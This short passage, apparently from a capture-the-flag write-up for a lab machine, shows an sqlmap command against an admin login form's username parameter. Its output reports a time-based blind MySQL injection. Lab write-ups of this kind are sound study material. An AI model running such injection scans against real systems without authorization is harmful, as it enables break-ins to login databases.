Running sqlmap on the login form in admin.cronos.htb shows its vulnerable

```bash
$ sqlmap -r req.txt -p username
[18:18:14] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[18:18:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:18:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
got a 302 redirect to 'http://admin.cronos.htb:80/welcome.php'. Do you want to follow? [Y/n] Y
```